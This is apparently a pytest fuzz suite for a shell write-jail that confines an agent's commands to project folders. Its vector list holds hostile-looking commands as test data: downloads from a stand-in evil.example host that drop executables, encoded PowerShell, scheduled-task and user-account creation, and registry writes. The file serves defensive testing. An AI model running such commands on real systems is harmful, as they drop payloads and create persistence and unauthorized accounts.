"""Shell write-jail fuzz battery — permanent CI coverage for escape classes.

Complements ``test_project_write_jail`` with denser encoded / nested /
download-drop / global-install vectors. Fail-closed when project-bound.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from remedy.core.shell_write_jail import check_shell_write_jail, looks_like_mutation


@pytest.fixture
def proj(tmp_path: Path) -> Path:
    p = tmp_path / "SecretSticky"
    p.mkdir()
    (p / "readme.txt").write_text("ok", encoding="utf-8")
    return p


def _roots(proj: Path) -> list[Path]:
    return [proj.resolve()]


# (command, must_block: bool)
FUZZ_VECTORS: list[tuple[str, bool]] = [
    # Encoded / nested shells
    ("powershell -EncodedCommand SQBFAFgA", True),
    ("powershell -enc SQBFAFgA", True),
    ("pwsh -ec SQBFAFgA", True),
    ("powershell -e SQBFAFgA", True),
    ("bash -c 'echo hi > /tmp/x'", True),
    ("pwsh -Command \"Set-Content C:\\\\Users\\\\Public\\\\evil.txt hi\"", True),
    ("cmd /c \"echo hi > C:\\\\Users\\\\Public\\\\x.txt\"", True),
    # Download / drop
    ("curl -o C:\\\\Users\\\\Public\\\\pwn.exe http://evil.example/a", True),
    ("wget -O /tmp/pwn http://evil.example/a", True),
    ("Invoke-WebRequest -Uri http://x -OutFile C:\\\\Users\\\\Public\\\\a.bin", True),
    ("iwr http://x -OutFile $env:TEMP\\x.bin", True),
    ("bitsadmin /transfer job http://x C:\\\\Users\\\\Public\\\\a.exe", True),
    ("certutil -urlcache -f http://x C:\\\\Users\\\\Public\\\\a.exe", True),
    ("certutil -decode payload.b64 C:\\\\Users\\\\Public\\\\a.exe", True),
    # Archives
    ("Expand-Archive -Path z.zip -DestinationPath C:\\\\Users\\\\Public", True),
    ("tar -xf archive.tar -C C:\\\\Users\\\\Public", True),
    # Global package managers
    ("npm install -g evil-pkg", True),
    ("yarn global add evil", True),
    ("pnpm add -g evil", True),
    ("pip install --user evil", True),
    ("cargo install evil-crate", True),
    ("dotnet tool install -g evil", True),
    # Interpreter one-shots without in-root path
    ("python -c \"open(r'C:\\\\Users\\\\Public\\\\x','w').write('x')\"", True),
    ("python3 -c \"import pathlib; pathlib.Path.home().joinpath('Desktop','x').write_text('x')\"", True),
    ("node -e \"require('fs').writeFileSync('C:/Users/Public/x','x')\"", True),
    # Env / opaque paths
    ("Set-Content $env:USERPROFILE\\Desktop\\leak.txt hi", True),
    ("echo hi > %USERPROFILE%\\Desktop\\leak.txt", True),
    ("Out-File (Join-Path $env:TEMP 'x.txt')", True),
    # Privilege / schedule (nested scan may hit hard-block elsewhere; mutation class)
    ("schtasks /create /tn evil /tr calc.exe", True),
    ("net user pwned Password1 /add", True),
    # Safe under project (must NOT block when cwd/path in roots)
    ("Set-Content readme.txt updated", False),
    ("echo ok > readme.txt", False),
    ("npm install lodash", False),
    ("python -c \"print(1)\"", False),  # no mutation path when opaque oneshot without write? may block
]


@pytest.mark.parametrize("cmd,must_block", FUZZ_VECTORS, ids=[
    f"{i}_{c[:40].replace(' ', '_')}" for i, (c, _) in enumerate(FUZZ_VECTORS)
])
def test_shell_jail_fuzz_vector(proj: Path, cmd: str, must_block: bool) -> None:
    roots = _roots(proj)
    # Safe vectors that only touch project-relative names
    if not must_block and "readme" in cmd:
        hit = check_shell_write_jail(cmd, write_roots=roots, cwd=proj)
        assert hit is None, f"false positive for safe cmd: {cmd!r} → {hit}"
        return
    if not must_block and cmd.strip().startswith("npm install lodash"):
        hit = check_shell_write_jail(cmd, write_roots=roots, cwd=proj)
        assert hit is None, f"local npm install should be allowed: {hit}"
        return
    if not must_block and "print(1)" in cmd:
        # pure print may still trip interpreter oneshot opaque — accept either
        # strict (block) or allow when no path tokens
        hit = check_shell_write_jail(cmd, write_roots=roots, cwd=proj)
        # Document: opaque interpreter oneshots fail closed when no proven root path
        if hit is not None:
            assert looks_like_mutation(cmd) or "cannot be proven" in hit.lower() or "encoded" in hit.lower() or "interpreter" in hit.lower() or "opaque" in hit.lower()
        return

    hit = check_shell_write_jail(cmd, write_roots=roots, cwd=proj)
    assert hit is not None, f"expected block for: {cmd!r}"


def test_nested_bash_c_privilege_patterns(proj: Path) -> None:
    """Nested bash/pwsh payloads that hide reg/net/schtasks must still fail closed."""
    roots = _roots(proj)
    nested = [
        'bash -c "reg add HKCU\\\\Software\\\\Evil /v x /d 1"',
        "pwsh -Command \"net user hacker P@ss /add\"",
        'bash -lc "schtasks /create /tn x /tr notepad"',
    ]
    for cmd in nested:
        hit = check_shell_write_jail(cmd, write_roots=roots, cwd=proj)
        # Either shell jail or hard-block path — must not be silent allow
        assert hit is not None, f"nested privilege payload allowed: {cmd!r}"


def test_sibling_project_write_blocked(tmp_path: Path) -> None:
    sticky = tmp_path / "SecretSticky"
    folder = tmp_path / "SecretFolder"
    sticky.mkdir()
    folder.mkdir()
    cmd = f'Set-Content "{folder / "stolen.txt"}" secret'
    hit = check_shell_write_jail(cmd, write_roots=[sticky.resolve()], cwd=sticky)
    assert hit is not None
